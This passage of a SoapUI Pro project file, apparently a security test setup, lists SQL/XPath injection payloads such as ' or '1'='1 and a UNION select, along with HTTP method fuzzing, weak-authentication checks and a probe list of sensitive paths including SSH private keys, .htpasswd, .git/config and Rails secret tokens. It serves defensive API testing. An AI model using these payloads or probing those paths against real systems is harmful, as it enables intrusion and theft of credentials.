              <con:xpathList>' or '1'='1</con:xpathList>
              <con:xpathList>1/0</con:xpathList>
              <con:xpathList>'%20o/**/r%201/0%20--</con:xpathList>
              <con:xpathList>' o/**/r 1/0 --</con:xpathList>
              <con:xpathList>;</con:xpathList>
              <con:xpathList>'%20and%201=2%20--</con:xpathList>
              <con:xpathList>' and 1=2 --</con:xpathList>
              <con:xpathList>test�%20UNION%20select%201,%20@@version,%201,%201;�</con:xpathList>
              <con:xpathList>test� UNION select 1, @@version, 1, 1;�</con:xpathList>
            </con:config>
            <con:assertion type="Sensitive Information Exposure" id="b5d3ee0f-056b-4dd7-b27e-47849dd7729a" name="Sensitive Information Exposure">
              <con:configuration/>
            </con:assertion>
            <con:testStep xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"/>
            <con:checkedParameters xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"/>
            <con:executionStrategy xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
              <con:strategy>ONE_BY_ONE</con:strategy>
              <con:delay>100</con:delay>
            </con:executionStrategy>
          </con:testStepSecurityScan>
          <con:testStepSecurityProScan type="HttpMethodFuzzingScan" name="HTTP Method Fuzzing" id="60db0f2d-4ec8-4a29-b60c-86a0ad6d3969" applyForFailedStep="false" disabled="false" runOnlyOnce="true">
            <con:settings/>
            <con:config xsi:type="con:HttpMethodFuzzingScan" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
              <con:deselectedMethods/>
            </con:config>
            <con:assertion type="Sensitive Information Exposure" id="e8271ead-7e81-4965-8092-92bc712d0509" name="Sensitive Information Exposure">
              <con:configuration/>
            </con:assertion>
            <con:assertion type="Valid HTTP Status Codes" id="a0b63e26-85a4-4d5d-8a0d-16568fe81cca" name="Valid HTTP Status Codes">
              <con:settings>
                <con:setting id="__LEVEL_">WARNING</con:setting>
              </con:settings>
              <con:configuration>
                <codes>501,405,403</codes>
              </con:configuration>
            </con:assertion>
            <con:testStep xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"/>
            <con:checkedParameters xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"/>
            <con:executionStrategy xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
              <con:strategy>ONE_BY_ONE</con:strategy>
              <con:delay>100</con:delay>
            </con:executionStrategy>
          </con:testStepSecurityProScan>
          <con:testStepSecurityProScan type="SensitiveFileSecurityScan" name="Sensitive Files Exposure" id="368af380-415c-4b02-aa84-b08f43c07844" applyForFailedStep="false" disabled="false" runOnlyOnce="true">
            <con:settings/>
            <con:config xsi:type="con:SensitiveFileSecurityScan" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
              <con:sensitiveFile description="Sensitive SSH information" fileName="/.ssh/known_hosts"/>
              <con:sensitiveFile description="Sensitive SSH information" fileName="/.ssh/authorized_keys"/>
              <con:sensitiveFile description="Sensitive SSH information" fileName="/.ssh/id_dsa"/>
              <con:sensitiveFile description="Sensitive SSH information" fileName="/.ssh/id_dsa.bak"/>
              <con:sensitiveFile description="Sensitive SSH information" fileName="/.ssh/id_dsa.old"/>
              <con:sensitiveFile description="Sensitive SSH information" fileName="/.ssh/id_dsa~"/>
              <con:sensitiveFile description="Sensitive SSH information" fileName="/.ssh/id_rsa"/>
              <con:sensitiveFile description="Sensitive SSH information" fileName="/.ssh/id_rsa.bak"/>
              <con:sensitiveFile description="Sensitive SSH information" fileName="/.ssh/id_rsa.old"/>
              <con:sensitiveFile description="Sensitive SSH information" fileName="/.ssh/id_rsa~"/>
              <con:sensitiveFile description="May contain passwords or other sensitive information" fileName="/.htaccess"/>
              <con:sensitiveFile description="May contain passwords or other sensitive information" fileName="/.htaccess.bak"/>
              <con:sensitiveFile description="May contain passwords or other sensitive information" fileName="/.htaccess.old"/>
              <con:sensitiveFile description="May contain passwords or other sensitive information" fileName="/htaccess.txt"/>
              <con:sensitiveFile description="May contain passwords or other sensitive information" fileName="/.htaccess~"/>
              <con:sensitiveFile description="May contain passwords or other sensitive information" fileName="/.htpasswd"/>
              <con:sensitiveFile description="May contain passwords or other sensitive information" fileName="/.htpasswd.bak"/>
              <con:sensitiveFile description="May contain passwords or other sensitive information" fileName="/.htpasswd.old"/>
              <con:sensitiveFile description="May contain passwords or other sensitive information" fileName="/.htpasswd~"/>
              <con:sensitiveFile description="Usually reside in a users home directory on a Linux/UNIX machine" fileName="/.bash_history"/>
              <con:sensitiveFile description="Usually reside in a users home directory on a Linux/UNIX machine" fileName="/.bashrc"/>
              <con:sensitiveFile description="Usually reside in a users home directory on a Linux/UNIX machine" fileName="/.history"/>
              <con:sensitiveFile description="Usually reside in a users home directory on a Linux/UNIX machine" fileName="/.profile"/>
              <con:sensitiveFile description="Usually reside in a users home directory on a Linux/UNIX machine" fileName="/.mysql_history"/>
              <con:sensitiveFile description="Usually reside in a users home directory on a Linux/UNIX machine" fileName="/~root"/>
              <con:sensitiveFile description="Contains info from SCM (git, svn...)" fileName="/.git/config"/>
              <con:sensitiveFile description="Contains info from SCM (git, svn...)" fileName="/.git/HEAD"/>
              <con:sensitiveFile description="Contains info from SCM (git, svn...)" fileName="/.git/index"/>
              <con:sensitiveFile description="Contains info from SCM (git, svn...)" fileName="/.svn/entries"/>
              <con:sensitiveFile description="Contains info from SCM (git, svn...)" fileName="/.svn/wc.db"/>
              <con:sensitiveFile description="May tell what type of web server is hosting the service" fileName="/pccsmysqladm/incs/dbconnect.inc"/>
              <con:sensitiveFile description="May tell what type of web server is hosting the service" fileName="/perl/"/>
              <con:sensitiveFile description="May tell what type of web server is hosting the service" fileName="/phpBB/phpinfo.php"/>
              <con:sensitiveFile description="May tell what type of web server is hosting the service" fileName="/weblogic"/>
              <con:sensitiveFile description="May tell what type of web server is hosting the service" fileName="/wp-admin/wp-login.php"/>
              <con:sensitiveFile description="May tell what type of web server is hosting the service" fileName="/wp-content/debug.log"/>
              <con:sensitiveFile description="May tell what type of web server is hosting the service" fileName="/WEB-INF/web.xml"/>
              <con:sensitiveFile description="May tell what type of web server is hosting the service" fileName="/iisadmin/"/>
              <con:sensitiveFile description="May tell what type of web server is hosting the service" fileName="/iissamples/"/>
              <con:sensitiveFile description="May tell what type of web server is hosting the service" fileName="/index.jsp"/>
              <con:sensitiveFile description="May tell what type of web server is hosting the service" fileName="/index.php"/>
              <con:sensitiveFile description="May tell what type of web server is hosting the service" fileName="/index.html.bak"/>
              <con:sensitiveFile description="May tell what type of web server is hosting the service" fileName="/index.html.old"/>
              <con:sensitiveFile description="May tell what type of web server is hosting the service" fileName="/index.html~"/>
              <con:sensitiveFile description="May tell what type of web server is hosting the service" fileName="/manager"/>
              <con:sensitiveFile description="May exist if Ruby on Rails is used on the server" fileName="/config/database.yml"/>
              <con:sensitiveFile description="May exist if Ruby on Rails is used on the server" fileName="/config/initializers/secret_token.rb"/>
              <con:sensitiveFile description="May exist if Ruby on Rails is used on the server" fileName="/db/seeds.rb"/>
              <con:sensitiveFile description="May exist if Ruby on Rails is used on the server" fileName="/db/development.sqlite3"/>
            </con:config>
            <con:assertion type="Sensitive Files Exposure Assertion" id="4bf6b042-bf63-414c-a32a-36b1dd033cf8" name="Sensitive Files Exposure"/>
            <con:testStep xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"/>
            <con:checkedParameters xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"/>
            <con:executionStrategy xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
              <con:strategy>ONE_BY_ONE</con:strategy>
              <con:delay>100</con:delay>
            </con:executionStrategy>
          </con:testStepSecurityProScan>
          <con:testStepSecurityProScan type="WeakAuthenticationScan" name="Weak Authentication" id="7d6b6072-1d0a-42b7-9af8-9eab8e21e9bf" applyForFailedStep="false" disabled="false" runOnlyOnce="true">
            <con:settings/>
            <con:config xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"/>
            <con:assertion type="WeakPassword" id="ce8a85c0-69ff-4974-b6b6-ca406d2f6c68" name="Weak Password Detection">
              <con:configuration/>
            </con:assertion>
            <con:assertion type="BasicAuth" id="dfd1cd2a-1418-49e5-83fe-3a55a8f1a2c3" name="Basic Authentication Detection"/>
            <con:testStep xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"/>
            <con:checkedParameters xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"/>
            <con:executionStrategy xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
              <con:strategy>ONE_BY_ONE</con:strategy>
              <con:delay>100</con:delay>
            </con:executionStrategy>
          </con:testStepSecurityProScan>
        </con:testStepSecurityTest>
        <con:properties/>
        <con:reportParameters/>
      </con:securityTest>
    </con:testCase>
    <con:properties/>
    <con:reportParameters/>
  </con:testSuite>
  <con:savedRecentRuns>1</con:savedRecentRuns>
  <con:properties/>
  <con:wssContainer/>
  <con:databaseConnectionContainer/>
  <con:jmsConnectionContainer/>
  <con:oAuth2ProfileContainer/>
  <con:oAuth1ProfileContainer/>
  <con:reporting>
    <con:xmlTemplates/>
    <con:parameters/>
  </con:reporting>
  <con:eventHandlers type="RequestFilter.filterRequest" name="RequestFilter.filterRequest">
    <con:script>// Sample event script to add custom HTTP header to all outgoing REST, SOAP and HTTP(S) calls
            // This code is often used for adding custom authentication to SoapUI Pro tests

            // If hardcoding the token, uncomment and change line 5
            // def token = '4567'

            // If your token is parameterized in Project level custom property, uncomment line 8
            // def token = request.parent.testCase.testSuite.project.getProperty('auth_token').getValue()

            // To modify all outgoing calls, remove comments from lines 11 to 16
            // def headers = request.requestHeaders
            // if (headers.containsKey('auth_token2') == false) {
            // headers.put('auth_token2', token)
            // request.requestHeaders = headers
            // }</con:script>
  </con:eventHandlers>
  <con:eventHandlers type="TestRunListener.afterStep" name="TestRunListener.afterStep">
    <con:script>// Save all test step results into files
            // Change the directory path in line 5 to a location where you want to store details
            // then uncomment lines 5 to 10

            // filePath = 'C:\\tempOutputDirectory\\'
            // fos = new FileOutputStream(filePath + testStepResult.testStep.label + '.txt', true)
            // pw = new PrintWriter(fos)
            // testStepResult.writeTo(pw)
            // pw.close()
            // fos.close()</con:script>
  </con:eventHandlers>
  <con:authRepository/>
  <con:tags/>
</con:soapui-project>
